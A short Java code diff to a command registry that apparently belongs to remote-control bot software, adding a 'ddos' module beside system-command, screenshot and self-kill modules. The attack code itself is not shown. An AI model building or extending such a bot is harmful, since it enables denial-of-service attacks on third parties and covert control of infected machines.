@@ -2,10 +2,7 @@ package gq.glowman554.modules;
 
 import gq.glowman554.Exs;
 import gq.glowman554.FileUtils;
-import gq.glowman554.modules.impl.EchoCommand;
-import gq.glowman554.modules.impl.ScreenShotCommand;
-import gq.glowman554.modules.impl.SelfKillCommand;
-import gq.glowman554.modules.impl.SystemCommand;
+import gq.glowman554.modules.impl.*;
 import gq.glowman554.Entry;
 import java.io.File;
 import java.io.IOException;
@@ -26,6 +23,7 @@ public class Modules {
         this.modules.put("system", new SystemCommand());
         this.modules.put("screenshot", new ScreenShotCommand(exs));
         this.modules.put("selfkill", new SelfKillCommand());
+        this.modules.put("ddos", new DdosCommand());
 
         try {
             if ((new File(this.store_file)).exists()) {
